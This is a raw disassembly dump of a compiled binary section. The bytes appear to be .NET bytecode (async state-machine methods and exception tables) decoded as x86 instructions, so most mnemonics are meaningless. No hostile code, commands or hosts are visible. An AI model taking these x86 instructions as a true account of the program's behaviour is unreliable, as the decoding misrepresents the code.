  403c8b:	06                   	push   %es
  403c8c:	72 e4                	jb     0x403c72
  403c8e:	06                   	push   %es
  403c8f:	00 70 28             	add    %dh,0x28(%eax)
  403c92:	4d                   	dec    %ebp
  403c93:	00 00                	add    %al,(%eax)
  403c95:	0a 0c 02             	or     (%edx,%eax,1),%cl
  403c98:	7b 3f                	jnp    0x403cd9
  403c9a:	00 00                	add    %al,(%eax)
  403c9c:	04 07                	add    $0x7,%al
  403c9e:	08 28                	or     %ch,(%eax)
  403ca0:	31 00                	xor    %eax,(%eax)
  403ca2:	00 0a                	add    %cl,(%edx)
  403ca4:	7d 3c                	jge    0x403ce2
  403ca6:	00 00                	add    %al,(%eax)
  403ca8:	04 02                	add    $0x2,%al
  403caa:	7b 3f                	jnp    0x403ceb
  403cac:	00 00                	add    %al,(%eax)
  403cae:	04 7b                	add    $0x7b,%al
  403cb0:	3c 00                	cmp    $0x0,%al
  403cb2:	00 04 28             	add    %al,(%eax,%ebp,1)
  403cb5:	34 00                	xor    $0x0,%al
  403cb7:	00 0a                	add    %cl,(%edx)
  403cb9:	3a 85 00 00 00 02    	cmp    0x2000000(%ebp),%al
  403cbf:	7b 3f                	jnp    0x403d00
  403cc1:	00 00                	add    %al,(%eax)
  403cc3:	04 fe                	add    $0xfe,%al
  403cc5:	06                   	push   %es
  403cc6:	4a                   	dec    %edx
  403cc7:	00 00                	add    %al,(%eax)
  403cc9:	06                   	push   %es
  403cca:	73 b5                	jae    0x403c81
  403ccc:	00 00                	add    %al,(%eax)
  403cce:	0a 28                	or     (%eax),%ch
  403cd0:	b6 00                	mov    $0x0,%dh
  403cd2:	00 0a                	add    %cl,(%edx)
  403cd4:	6f                   	outsl  %ds:(%esi),(%dx)
  403cd5:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
  403cda:	12 03                	adc    (%ebx),%al
  403cdc:	28 bc 00 00 0a 2d 3f 	sub    %bh,0x3f2d0a00(%eax,%eax,1)
  403ce3:	02 16                	add    (%esi),%dl
  403ce5:	25 0a 7d 3d 00       	and    $0x3d7d0a,%eax
  403cea:	00 04 02             	add    %al,(%edx,%eax,1)
  403ced:	09 7d 42             	or     %edi,0x42(%ebp)
  403cf0:	00 00                	add    %al,(%eax)
  403cf2:	04 02                	add    $0x2,%al
  403cf4:	7c 3e                	jl     0x403d34
  403cf6:	00 00                	add    %al,(%eax)
  403cf8:	04 12                	add    $0x12,%al
  403cfa:	03 02                	add    (%edx),%eax
  403cfc:	28 0e                	sub    %cl,(%esi)
  403cfe:	00 00                	add    %al,(%eax)
  403d00:	2b dd                	sub    %ebp,%ebx
  403d02:	b6 00                	mov    $0x0,%dh
  403d04:	00 00                	add    %al,(%eax)
  403d06:	02 7b 42             	add    0x42(%ebx),%bh
  403d09:	00 00                	add    %al,(%eax)
  403d0b:	04 0d                	add    $0xd,%al
  403d0d:	02 7c 42 00          	add    0x0(%edx,%eax,2),%bh
  403d11:	00 04 fe             	add    %al,(%esi,%edi,8)
  403d14:	15 32 00 00 01       	adc    $0x1000032,%eax
  403d19:	02 15 25 0a 7d 3d    	add    0x3d7d0a25,%dl
  403d1f:	00 00                	add    %al,(%eax)
  403d21:	04 12                	add    $0x12,%al
  403d23:	03 28                	add    (%eax),%ebp
  403d25:	be 00 00 0a 72       	mov    $0x720a0000,%esi
  403d2a:	cf                   	iret
  403d2b:	0c 00                	or     $0x0,%al
  403d2d:	70 02                	jo     0x403d31
  403d2f:	7b 3f                	jnp    0x403d70
  403d31:	00 00                	add    %al,(%eax)
  403d33:	04 7b                	add    $0x7b,%al
  403d35:	3c 00                	cmp    $0x0,%al
  403d37:	00 04 28             	add    %al,(%eax,%ebp,1)
  403d3a:	4d                   	dec    %ebp
  403d3b:	00 00                	add    %al,(%eax)
  403d3d:	0a 28                	or     (%eax),%ch
  403d3f:	2a 00                	sub    (%eax),%al
  403d41:	00 06                	add    %al,(%esi)
  403d43:	02 14 7d 3f 00 00 04 	add    0x400003f(,%edi,2),%dl
  403d4a:	de 1a                	ficomps (%edx)
  403d4c:	13 04 72             	adc    (%edx,%esi,2),%eax
  403d4f:	03 0d 00 70 11 04    	add    0x4117000,%ecx
  403d55:	6f                   	outsl  %ds:(%esi),(%dx)
  403d56:	50                   	push   %eax
  403d57:	00 00                	add    %al,(%eax)
  403d59:	0a 28                	or     (%eax),%ch
  403d5b:	4d                   	dec    %ebp
  403d5c:	00 00                	add    %al,(%eax)
  403d5e:	0a 28                	or     (%eax),%ch
  403d60:	2a 00                	sub    (%eax),%al
  403d62:	00 06                	add    %al,(%esi)
  403d64:	de 00                	fiadds (%eax)
  403d66:	02 02                	add    (%edx),%al
  403d68:	7b 41                	jnp    0x403dab
  403d6a:	00 00                	add    %al,(%eax)
  403d6c:	04 17                	add    $0x17,%al
  403d6e:	58                   	pop    %eax
  403d6f:	7d 41                	jge    0x403db2
  403d71:	00 00                	add    %al,(%eax)
  403d73:	04 02                	add    $0x2,%al
  403d75:	7b 41                	jnp    0x403db8
  403d77:	00 00                	add    %al,(%eax)
  403d79:	04 02                	add    $0x2,%al
  403d7b:	7b 40                	jnp    0x403dbd
  403d7d:	00 00                	add    %al,(%eax)
  403d7f:	04 8e                	add    $0x8e,%al
  403d81:	69 3f d2 fe ff ff    	imul   $0xfffffed2,(%edi),%edi
  403d87:	02 14 7d 40 00 00 04 	add    0x4000040(,%edi,2),%dl
  403d8e:	de 19                	ficomps (%ecx)
  403d90:	13 05 02 1f fe 7d    	adc    0x7dfe1f02,%eax
  403d96:	3d 00 00 04 02       	cmp    $0x2040000,%eax
  403d9b:	7c 3e                	jl     0x403ddb
  403d9d:	00 00                	add    %al,(%eax)
  403d9f:	04 11                	add    $0x11,%al
  403da1:	05 28 c2 00 00       	add    $0xc228,%eax
  403da6:	0a de                	or     %dh,%bl
  403da8:	13 02                	adc    (%edx),%eax
  403daa:	1f                   	pop    %ds
  403dab:	fe                   	(bad)
  403dac:	7d 3d                	jge    0x403deb
  403dae:	00 00                	add    %al,(%eax)
  403db0:	04 02                	add    $0x2,%al
  403db2:	7c 3e                	jl     0x403df2
  403db4:	00 00                	add    %al,(%eax)
  403db6:	04 28                	add    $0x28,%al
  403db8:	c3                   	ret
  403db9:	00 00                	add    %al,(%eax)
  403dbb:	0a 2a                	or     (%edx),%ch
  403dbd:	00 00                	add    %al,(%eax)
  403dbf:	00 41 34             	add    %al,0x34(%ecx)
  403dc2:	00 00                	add    %al,(%eax)
  403dc4:	00 00                	add    %al,(%eax)
  403dc6:	00 00                	add    %al,(%eax)
  403dc8:	30 00                	xor    %al,(%eax)
  403dca:	00 00                	add    %al,(%eax)
  403dcc:	e4 00                	in     $0x0,%al
  403dce:	00 00                	add    %al,(%eax)
  403dd0:	14 01                	adc    $0x1,%al
  403dd2:	00 00                	add    %al,(%eax)
  403dd4:	1a 00                	sbb    (%eax),%al
  403dd6:	00 00                	add    %al,(%eax)
  403dd8:	24 00                	and    $0x0,%al
  403dda:	00 01                	add    %al,(%ecx)
  403ddc:	00 00                	add    %al,(%eax)
  403dde:	00 00                	add    %al,(%eax)
  403de0:	07                   	pop    %es
  403de1:	00 00                	add    %al,(%eax)
  403de3:	00 51 01             	add    %dl,0x1(%ecx)
  403de6:	00 00                	add    %al,(%eax)
  403de8:	58                   	pop    %eax
  403de9:	01 00                	add    %eax,(%eax)
  403deb:	00 19                	add    %bl,(%ecx)
  403ded:	00 00                	add    %al,(%eax)
  403def:	00 24 00             	add    %ah,(%eax,%eax,1)
  403df2:	00 01                	add    %al,(%ecx)
  403df4:	36 02 7c 3e 00       	add    %ss:0x0(%esi,%edi,1),%bh
  403df9:	00 04 03             	add    %al,(%ebx,%eax,1)
  403dfc:	28 c4                	sub    %al,%ah
  403dfe:	00 00                	add    %al,(%eax)
  403e00:	0a 2a                	or     (%edx),%ch
  403e02:	00 00                	add    %al,(%eax)
  403e04:	1b 30                	sbb    (%eax),%esi
  403e06:	04 00                	add    $0x0,%al
  403e08:	12 03                	adc    (%ebx),%al
  403e0a:	00 00                	add    %al,(%eax)
  403e0c:	23 00                	and    (%eax),%eax
  403e0e:	00 11                	add    %dl,(%ecx)
  403e10:	02 7b 43             	add    0x43(%ebx),%bh
  403e13:	00 00                	add    %al,(%eax)
  403e15:	04 0a                	add    $0xa,%al
  403e17:	02 7b 45             	add    0x45(%ebx),%bh
  403e1a:	00 00                	add    %al,(%eax)
  403e1c:	04 0b                	add    $0xb,%al
  403e1e:	06                   	push   %es
  403e1f:	17                   	pop    %ss
  403e20:	36 15 06 18 3b 5c    	ss adc $0x5c3b1806,%eax
  403e26:	02 00                	add    (%eax),%al
  403e28:	00 02                	add    %al,(%edx)
  403e2a:	14 7d                	adc    $0x7d,%al
  403e2c:	46                   	inc    %esi
  403e2d:	00 00                	add    %al,(%eax)
  403e2f:	04 02                	add    $0x2,%al
  403e31:	16                   	push   %ss
  403e32:	7d 47                	jge    0x403e7b
  403e34:	00 00                	add    %al,(%eax)
  403e36:	04 00                	add    $0x0,%al
  403e38:	06                   	push   %es
  403e39:	17                   	pop    %ss
  403e3a:	26 26 00 06          	es add %al,%es:(%esi)
  403e3e:	2c 4e                	sub    $0x4e,%al
  403e40:	06                   	push   %es
  403e41:	17                   	pop    %ss
  403e42:	3b cf                	cmp    %edi,%ecx
  403e44:	00 00                	add    %al,(%eax)
  403e46:	00 07                	add    %al,(%edi)
  403e48:	7b 1a                	jnp    0x403e64
  403e4a:	00 00                	add    %al,(%eax)
  403e4c:	04 20                	add    $0x20,%al
  403e4e:	bd 01 00 00 20       	mov    $0x20000001,%ebp
  403e53:	2c 01                	sub    $0x1,%al
  403e55:	00 00                	add    %al,(%eax)
  403e57:	28 11                	sub    %dl,(%ecx)
  403e59:	00 00                	add    %al,(%eax)
  403e5b:	06                   	push   %es
  403e5c:	6f                   	outsl  %ds:(%esi),(%dx)
  403e5d:	c7 00 00 0a 0c 12    	movl   $0x120c0a00,(%eax)
  403e63:	02 28                	add    (%eax),%ch
  403e65:	c8 00 00 0a          	enter  $0x0,$0xa
  403e69:	2d 3f 02 16 25       	sub    $0x2516023f,%eax
  403e6e:	0a 7d 43             	or     0x43(%ebp),%bh
  403e71:	00 00                	add    %al,(%eax)
  403e73:	04 02                	add    $0x2,%al
  403e75:	08 7d 48             	or     %bh,0x48(%ebp)
  403e78:	00 00                	add    %al,(%eax)
  403e7a:	04 02                	add    $0x2,%al
  403e7c:	7c 44                	jl     0x403ec2
  403e7e:	00 00                	add    %al,(%eax)
  403e80:	04 12                	add    $0x12,%al
  403e82:	02 02                	add    (%edx),%al
  403e84:	28 0f                	sub    %cl,(%edi)
  403e86:	00 00                	add    %al,(%eax)
  403e88:	2b dd                	sub    %ebp,%ebx
  403e8a:	93                   	xchg   %eax,%ebx
  403e8b:	02 00                	add    (%eax),%al
  403e8d:	00 02                	add    %al,(%edx)
  403e8f:	7b 48                	jnp    0x403ed9
  403e91:	00 00                	add    %al,(%eax)
  403e93:	04 0c                	add    $0xc,%al
  403e95:	02 7c 48 00          	add    0x0(%eax,%ecx,2),%bh
  403e99:	00 04 fe             	add    %al,(%esi,%edi,8)
  403e9c:	15 08 00 00 1b       	adc    $0x1b000008,%eax
  403ea1:	02 15 25 0a 7d 43    	add    0x437d0a25,%dl
  403ea7:	00 00                	add    %al,(%eax)
  403ea9:	04 12                	add    $0x12,%al
  403eab:	02 28                	add    (%eax),%ch
  403ead:	c9                   	leave
  403eae:	00 00                	add    %al,(%eax)
  403eb0:	0a 2d 05 dd 6e 01    	or     0x16edd05,%ch
  403eb6:	00 00                	add    %al,(%eax)
  403eb8:	07                   	pop    %es
  403eb9:	7b 1a                	jnp    0x403ed5
  403ebb:	00 00                	add    %al,(%eax)
  403ebd:	04 28                	add    $0x28,%al
  403ebf:	10 00                	adc    %al,(%eax)
  403ec1:	00 06                	add    %al,(%esi)
  403ec3:	2d 05 dd 5c 01       	sub    $0x15cdd05,%eax
  403ec8:	00 00                	add    %al,(%eax)
  403eca:	02 7e 04             	add    0x4(%esi),%bh
  403ecd:	00 00                	add    %al,(%eax)
  403ecf:	04 7d                	add    $0x7d,%al
  403ed1:	49                   	dec    %ecx
  403ed2:	00 00                	add    %al,(%eax)
  403ed4:	04 02                	add    $0x2,%al
  403ed6:	16                   	push   %ss
  403ed7:	7d 4a                	jge    0x403f23
  403ed9:	00 00                	add    %al,(%eax)
  403edb:	04 38                	add    $0x38,%al
  403edd:	24 01                	and    $0x1,%al
  403edf:	00 00                	add    %al,(%eax)
  403ee1:	02 02                	add    (%edx),%al
  403ee3:	7b 49                	jnp    0x403f2e
  403ee5:	00 00                	add    %al,(%eax)
  403ee7:	04 02                	add    $0x2,%al
  403ee9:	7b 4a                	jnp    0x403f35
  403eeb:	00 00                	add    %al,(%eax)
  403eed:	04 9a                	add    $0x9a,%al
  403eef:	7d 4b                	jge    0x403f3c
  403ef1:	00 00                	add    %al,(%eax)
  403ef3:	04 72                	add    $0x72,%al
  403ef5:	39 0d 00 70 07 7b    	cmp    %ecx,0x7b077000
  403efb:	1a 00                	sbb    (%eax),%al
  403efd:	00 04 02             	add    %al,(%edx,%eax,1)
  403f00:	7b 4b                	jnp    0x403f4d
  403f02:	00 00                	add    %al,(%eax)
  403f04:	04 28                	add    $0x28,%al
  403f06:	b9 00 00 0a 0d       	mov    $0xd0a0000,%ecx
  403f0b:	09 28                	or     %ebp,(%eax)
  403f0d:	34 00                	xor    $0x0,%al
  403f0f:	00 0a                	add    %cl,(%edx)
  403f11:	3a e1                	cmp    %cl,%ah
  403f13:	00 00                	add    %al,(%eax)
  403f15:	00 00                	add    %al,(%eax)
  403f17:	06                   	push   %es
  403f18:	17                   	pop    %ss
  403f19:	2e 61                	cs popa
  403f1b:	07                   	pop    %es
  403f1c:	7b 1b                	jnp    0x403f39
  403f1e:	00 00                	add    %al,(%eax)
  403f20:	04 7b                	add    $0x7b,%al
  403f22:	18 00                	sbb    %al,(%eax)
  403f24:	00 04 09             	add    %al,(%ecx,%ecx,1)
  403f27:	28 72 00             	sub    %dh,0x0(%edx)
  403f2a:	00 0a                	add    %cl,(%edx)
  403f2c:	72 63                	jb     0x403f91
  403f2e:	0d 00 70 09 28       	or     $0x28097000,%eax
  403f33:	4d                   	dec    %ebp
  403f34:	00 00                	add    %al,(%eax)
  403f36:	0a 28                	or     (%eax),%ch
  403f38:	45                   	inc    %ebp
  403f39:	00 00                	add    %al,(%eax)
  403f3b:	0a 07                	or     (%edi),%al
  403f3d:	7b 1a                	jnp    0x403f59
  403f3f:	00 00                	add    %al,(%eax)
  403f41:	04 09                	add    $0x9,%al
  403f43:	28 12                	sub    %dl,(%edx)
  403f45:	00 00                	add    %al,(%eax)
  403f47:	06                   	push   %es
  403f48:	6f                   	outsl  %ds:(%esi),(%dx)
  403f49:	bb 00 00 0a 13       	mov    $0x130a0000,%ebx
  403f4e:	04 12                	add    $0x12,%al
  403f50:	04 28                	add    $0x28,%al
  403f52:	bc 00 00 0a 2d       	mov    $0x2d0a0000,%esp
  403f57:	41                   	inc    %ecx
  403f58:	02 17                	add    (%edi),%dl
  403f5a:	25 0a 7d 43 00       	and    $0x437d0a,%eax
  403f5f:	00 04 02             	add    %al,(%edx,%eax,1)
  403f62:	11 04 7d 4c 00 00 04 	adc    %eax,0x400004c(,%edi,2)
  403f69:	02 7c 44 00          	add    0x0(%esp,%eax,2),%bh
  403f6d:	00 04 12             	add    %al,(%edx,%edx,1)
  403f70:	04 02                	add    $0x2,%al
  403f72:	28 10                	sub    %dl,(%eax)
  403f74:	00 00                	add    %al,(%eax)
  403f76:	2b dd                	sub    %ebp,%ebx
  403f78:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403f79:	01 00                	add    %eax,(%eax)
  403f7b:	00 02                	add    %al,(%edx)
  403f7d:	7b 4c                	jnp    0x403fcb
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	04 13                	add    $0x13,%al
  403f83:	04 02                	add    $0x2,%al
  403f85:	7c 4c                	jl     0x403fd3
  403f87:	00 00                	add    %al,(%eax)
  403f89:	04 fe                	add    $0xfe,%al
  403f8b:	15 32 00 00 01       	adc    $0x1000032,%eax
  403f90:	02 15 25 0a 7d 43    	add    0x437d0a25,%dl
  403f96:	00 00                	add    %al,(%eax)
  403f98:	04 12                	add    $0x12,%al
  403f9a:	04 28                	add    $0x28,%al
  403f9c:	be 00 00 0a de       	mov    $0xde0a0000,%esi
  403fa1:	76 26                	jbe    0x403fc9
  403fa3:	de 4b 26             	fimuls 0x26(%ebx)
  403fa6:	de 48 13             	fimuls 0x13(%eax)
  403fa9:	05 1c 8d 43 00       	add    $0x438d1c,%eax
  403fae:	00 01                	add    %al,(%ecx)
  403fb0:	25 16 72 a5 0d       	and    $0xda57216,%eax
  403fb5:	00 70 a2             	add    %dh,-0x5e(%eax)
  403fb8:	25 17 07 7b 1a       	and    $0x1a7b0717,%eax
  403fbd:	00 00                	add    %al,(%eax)
  403fbf:	04 a2                	add    $0xa2,%al
  403fc1:	25 18 72 cb 0d       	and    $0xdcb7218,%eax
  403fc6:	00 70 a2             	add    %dh,-0x5e(%eax)
  403fc9:	25 19 02 7b 4b       	and    $0x4b7b0219,%eax
  403fce:	00 00                	add    %al,(%eax)
  403fd0:	04 a2                	add    $0xa2,%al
  403fd2:	25 1a 72 49 0c       	and    $0xc49721a,%eax
  403fd7:	00 70 a2             	add    %dh,-0x5e(%eax)
  403fda:	25 1b 11 05 6f       	and    $0x6f05111b,%eax
  403fdf:	50                   	push   %eax
  403fe0:	00 00                	add    %al,(%eax)
  403fe2:	0a a2 28 36 00 00    	or     0x3628(%edx),%ah
  403fe8:	0a 28                	or     (%eax),%ch
  403fea:	45                   	inc    %ebp
  403feb:	00 00                	add    %al,(%eax)
  403fed:	0a de                	or     %dh,%bl
  403fef:	00 02                	add    %al,(%edx)
  403ff1:	14 7d                	adc    $0x7d,%al
  403ff3:	4b                   	dec    %ebx
  403ff4:	00 00                	add    %al,(%eax)
  403ff6:	04 02                	add    $0x2,%al
  403ff8:	02 7b 4a             	add    0x4a(%ebx),%bh
  403ffb:	00 00                	add    %al,(%eax)
  403ffd:	04 17                	add    $0x17,%al
  403fff:	58                   	pop    %eax
  404000:	7d 4a                	jge    0x40404c
  404002:	00 00                	add    %al,(%eax)
  404004:	04 02                	add    $0x2,%al
  404006:	7b 4a                	jnp    0x404052
  404008:	00 00                	add    %al,(%eax)
  40400a:	04 02                	add    $0x2,%al
  40400c:	7b 49                	jnp    0x404057
  40400e:	00 00                	add    %al,(%eax)
  404010:	04 8e                	add    $0x8e,%al
  404012:	69 3f c9 fe ff ff    	imul   $0xfffffec9,(%edi),%edi
  404018:	02 14 7d 49 00 00 04 	add    0x4000049(,%edi,2),%dl
  40401f:	de 03                	fiadds (%ebx)
  404021:	26 de 00             	fiadds %es:(%eax)
  404024:	de 15 02 17 7d 47    	ficoms 0x477d1702
  40402a:	00 00                	add    %al,(%eax)
  40402c:	04 de                	add    $0xde,%al
  40402e:	0c 13                	or     $0x13,%al
  404030:	06                   	push   %es
  404031:	02 11                	add    (%ecx),%dl
  404033:	06                   	push   %es
  404034:	7d 46                	jge    0x40407c
  404036:	00 00                	add    %al,(%eax)
  404038:	04 de                	add    $0xde,%al
  40403a:	00 7e 03             	add    %bh,0x3(%esi)
  40403d:	00 00                	add    %al,(%eax)
  40403f:	04 1f                	add    $0x1f,%al
  404041:	64 20 f4             	fs and %dh,%ah
  404044:	01 00                	add    %eax,(%eax)
  404046:	00 6f 6d             	add    %ch,0x6d(%edi)
  404049:	00 00                	add    %al,(%eax)
  40404b:	0a 28                	or     (%eax),%ch
  40404d:	ab                   	stos   %eax,%es:(%edi)
  40404e:	00 00                	add    %al,(%eax)
  404050:	0a 6f bb             	or     -0x45(%edi),%ch
  404053:	00 00                	add    %al,(%eax)
  404055:	0a 13                	or     (%ebx),%dl
  404057:	04 12                	add    $0x12,%al
  404059:	04 28                	add    $0x28,%al
  40405b:	bc 00 00 0a 2d       	mov    $0x2d0a0000,%esp
  404060:	41                   	inc    %ecx
  404061:	02 18                	add    (%eax),%bl
  404063:	25 0a 7d 43 00       	and    $0x437d0a,%eax
  404068:	00 04 02             	add    %al,(%edx,%eax,1)
  40406b:	11 04 7d 4c 00 00 04 	adc    %eax,0x400004c(,%edi,2)
  404072:	02 7c 44 00          	add    0x0(%esp,%eax,2),%bh
  404076:	00 04 12             	add    %al,(%edx,%edx,1)
  404079:	04 02                	add    $0x2,%al
  40407b:	28 10                	sub    %dl,(%eax)
  40407d:	00 00                	add    %al,(%eax)
  40407f:	2b dd                	sub    %ebp,%ebx
  404081:	9c                   	pushf
  404082:	00 00                	add    %al,(%eax)
  404084:	00 02                	add    %al,(%edx)
  404086:	7b 4c                	jnp    0x4040d4
  404088:	00 00                	add    %al,(%eax)
  40408a:	04 13                	add    $0x13,%al
  40408c:	04 02                	add    $0x2,%al
  40408e:	7c 4c                	jl     0x4040dc
  404090:	00 00                	add    %al,(%eax)
  404092:	04 fe                	add    $0xfe,%al
  404094:	15 32 00 00 01       	adc    $0x1000032,%eax
  404099:	02 15 25 0a 7d 43    	add    0x437d0a25,%dl
  40409f:	00 00                	add    %al,(%eax)
  4040a1:	04 12                	add    $0x12,%al
  4040a3:	04 28                	add    $0x28,%al
  4040a5:	be 00 00 0a 07       	mov    $0x70a0000,%esi
  4040aa:	7b 1b                	jnp    0x4040c7
  4040ac:	00 00                	add    %al,(%eax)
  4040ae:	04 7b                	add    $0x7b,%al
  4040b0:	19 00                	sbb    %eax,(%eax)
  4040b2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040b5:	ca 00 00             	lret   $0x0
  4040b8:	0a 26                	or     (%esi),%ah
  4040ba:	02 7b 46             	add    0x46(%ebx),%bh
  4040bd:	00 00                	add    %al,(%eax)
  4040bf:	04 13                	add    $0x13,%al
  4040c1:	06                   	push   %es
  4040c2:	11 06                	adc    %eax,(%esi)
  4040c4:	2c 17                	sub    $0x17,%al
  4040c6:	11 06                	adc    %eax,(%esi)
  4040c8:	75 24                	jne    0x4040ee
  4040ca:	00 00                	add    %al,(%eax)
  4040cc:	01 25 2d 03 11 06    	add    %esp,0x611032d
  4040d2:	7a 28                	jp     0x4040fc
  4040d4:	cb                   	lret
  4040d5:	00 00                	add    %al,(%eax)
  4040d7:	0a 6f cc             	or     -0x34(%edi),%ch
  4040da:	00 00                	add    %al,(%eax)
  4040dc:	0a 02                	or     (%edx),%al
  4040de:	7b 47                	jnp    0x404127
  4040e0:	00 00                	add    %al,(%eax)
  4040e2:	04 13                	add    $0x13,%al
  4040e4:	07                   	pop    %es
  4040e5:	11 07                	adc    %eax,(%edi)
  4040e7:	17                   	pop    %ss
  4040e8:	33 02                	xor    (%edx),%eax
  4040ea:	de 22                	fisubs (%edx)
  4040ec:	02 14 7d 46 00 00 04 	add    0x4000046(,%edi,2),%dl
  4040f3:	de 19                	ficomps (%ecx)
  4040f5:	13 08                	adc    (%eax),%ecx
  4040f7:	02 1f                	add    (%edi),%bl
  4040f9:	fe                   	(bad)
  4040fa:	7d 43                	jge    0x40413f
  4040fc:	00 00                	add    %al,(%eax)
  4040fe:	04 02                	add    $0x2,%al
  404100:	7c 44                	jl     0x404146
  404102:	00 00                	add    %al,(%eax)
  404104:	04 11                	add    $0x11,%al
  404106:	08 28                	or     %ch,(%eax)
  404108:	c2 00 00             	ret    $0x0
  40410b:	0a de                	or     %dh,%bl
  40410d:	13 02                	adc    (%edx),%eax
  40410f:	1f                   	pop    %ds
  404110:	fe                   	(bad)
  404111:	7d 43                	jge    0x404156
  404113:	00 00                	add    %al,(%eax)
  404115:	04 02                	add    $0x2,%al
  404117:	7c 44                	jl     0x40415d
  404119:	00 00                	add    %al,(%eax)
  40411b:	04 28                	add    $0x28,%al
  40411d:	c3                   	ret
  40411e:	00 00                	add    %al,(%eax)
  404120:	0a 2a                	or     (%edx),%ch
  404122:	00 00                	add    %al,(%eax)
  404124:	41                   	inc    %ecx
  404125:	94                   	xchg   %eax,%esp
  404126:	00 00                	add    %al,(%eax)
  404128:	00 00                	add    %al,(%eax)
  40412a:	00 00                	add    %al,(%eax)
  40412c:	07                   	pop    %es
  40412d:	01 00                	add    %eax,(%eax)
  40412f:	00 8b 00 00 00 92    	add    %cl,-0x6e000000(%ebx)
  404135:	01 00                	add    %eax,(%eax)
  404137:	00 03                	add    %al,(%ebx)
  404139:	00 00                	add    %al,(%eax)
  40413b:	00 33                	add    %dh,(%ebx)
  40413d:	00 00                	add    %al,(%eax)
  40413f:	01 00                	add    %eax,(%eax)
  404141:	00 00                	add    %al,(%eax)
  404143:	00 07                	add    %al,(%edi)
  404145:	01 00                	add    %eax,(%eax)
  404147:	00 8b 00 00 00 95    	add    %cl,-0x6b000000(%ebx)
  40414d:	01 00                	add    %eax,(%eax)
  40414f:	00 03                	add    %al,(%ebx)
  404151:	00 00                	add    %al,(%eax)
  404153:	00 34 00             	add    %dh,(%eax,%eax,1)
  404156:	00 01                	add    %al,(%ecx)
  404158:	00 00                	add    %al,(%eax)
  40415a:	00 00                	add    %al,(%eax)
  40415c:	07                   	pop    %es
  40415d:	01 00                	add    %eax,(%eax)
  40415f:	00 8b 00 00 00 98    	add    %cl,-0x68000000(%ebx)
  404165:	01 00                	add    %eax,(%eax)
  404167:	00 48 00             	add    %cl,0x0(%eax)
  40416a:	00 00                	add    %al,(%eax)
  40416c:	24 00                	and    $0x0,%al
  40416e:	00 01                	add    %al,(%ecx)
  404170:	00 00                	add    %al,(%eax)
  404172:	00 00                	add    %al,(%eax)
  404174:	2d 00 00 00 e4       	sub    $0xe4000000,%eax
  404179:	01 00                	add    %eax,(%eax)
  40417b:	00 11                	add    %dl,(%ecx)
  40417d:	02 00                	add    (%eax),%al
  40417f:	00 03                	add    %al,(%ebx)
  404181:	00 00                	add    %al,(%eax)
  404183:	00 13                	add    %dl,(%ebx)
  404185:	00 00                	add    %al,(%eax)
  404187:	01 00                	add    %eax,(%eax)
  404189:	00 00                	add    %al,(%eax)
  40418b:	00 28                	add    %ch,(%eax)
  40418d:	00 00                	add    %al,(%eax)
  40418f:	00 f7                	add    %dh,%bh
  404191:	01 00                	add    %eax,(%eax)
  404193:	00 1f                	add    %bl,(%edi)
  404195:	02 00                	add    (%eax),%al
  404197:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40419a:	00 00                	add    %al,(%eax)
  40419c:	13 00                	adc    (%eax),%eax
  40419e:	00 01                	add    %al,(%ecx)
  4041a0:	00 00                	add    %al,(%eax)
  4041a2:	00 00                	add    %al,(%eax)
  4041a4:	0e                   	push   %cs
  4041a5:	00 00                	add    %al,(%eax)
  4041a7:	00 d7                	add    %dl,%bh
  4041a9:	02 00                	add    (%eax),%al
  4041ab:	00 e5                	add    %ah,%ch
  4041ad:	02 00                	add    (%eax),%al
  4041af:	00 19                	add    %bl,(%ecx)
  4041b1:	00 00                	add    %al,(%eax)
  4041b3:	00 24 00             	add    %ah,(%eax,%eax,1)
  4041b6:	00 01                	add    %al,(%ecx)
  4041b8:	36 02 7c 44 00       	add    %ss:0x0(%esp,%eax,2),%bh
  4041bd:	00 04 03             	add    %al,(%ebx,%eax,1)
  4041c0:	28 c4                	sub    %al,%ah
  4041c2:	00 00                	add    %al,(%eax)
  4041c4:	0a 2a                	or     (%edx),%ch
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	1b 30                	sbb    (%eax),%esi
  4041ca:	03 00                	add    (%eax),%eax
  4041cc:	5e                   	pop    %esi
  4041cd:	02 00                	add    (%eax),%al
  4041cf:	00 24 00             	add    %ah,(%eax,%eax,1)
  4041d2:	00 11                	add    %dl,(%ecx)
  4041d4:	02 7b 4d             	add    0x4d(%ebx),%bh
  4041d7:	00 00                	add    %al,(%eax)
  4041d9:	04 0a                	add    $0xa,%al
  4041db:	06                   	push   %es
  4041dc:	18 42 12             	sbb    %al,0x12(%edx)
  4041df:	02 00                	add    (%eax),%al
  4041e1:	00 00                	add    %al,(%eax)
  4041e3:	06                   	push   %es
  4041e4:	45                   	inc    %ebp
  4041e5:	03 00                	add    (%eax),%eax
  4041e7:	00 00                	add    %al,(%eax)
  4041e9:	55                   	push   %ebp
  4041ea:	00 00                	add    %al,(%eax)
  4041ec:	00 20                	add    %ah,(%eax)
  4041ee:	01 00                	add    %eax,(%eax)
  4041f0:	00 92 01 00 00 7e    	add    %dl,0x7e000001(%edx)
  4041f6:	0c 00                	or     $0x0,%al
  4041f8:	00 04 20             	add    %al,(%eax,%eiz,1)
  4041fb:	80 ee 36             	sub    $0x36,%dh
  4041fe:	00 20                	add    %ah,(%eax)
  404200:	00 dd                	add    %bl,%ch
  404202:	6d                   	insl   (%dx),%es:(%edi)
  404203:	00 6f 6d             	add    %ch,0x6d(%edi)
  404206:	00 00                	add    %al,(%eax)
  404208:	0a 7e 0e             	or     0xe(%esi),%bh
  40420b:	00 00                	add    %al,(%eax)
  40420d:	04 6f                	add    $0x6f,%al
  40420f:	87 00                	xchg   %eax,(%eax)
  404211:	00 0a                	add    %cl,(%edx)
  404213:	28 cd                	sub    %cl,%ch
  404215:	00 00                	add    %al,(%eax)
  404217:	0a 6f bb             	or     -0x45(%edi),%ch
  40421a:	00 00                	add    %al,(%eax)
  40421c:	0a 0c 12             	or     (%edx,%edx,1),%cl
  40421f:	02 28                	add    (%eax),%ch
  404221:	bc 00 00 0a 2d       	mov    $0x2d0a0000,%esp
  404226:	3f                   	aas
  404227:	02 16                	add    (%esi),%dl
  404229:	25 0a 7d 4d 00       	and    $0x4d7d0a,%eax
  40422e:	00 04 02             	add    %al,(%edx,%eax,1)
  404231:	08 7d 50             	or     %bh,0x50(%ebp)
  404234:	00 00                	add    %al,(%eax)
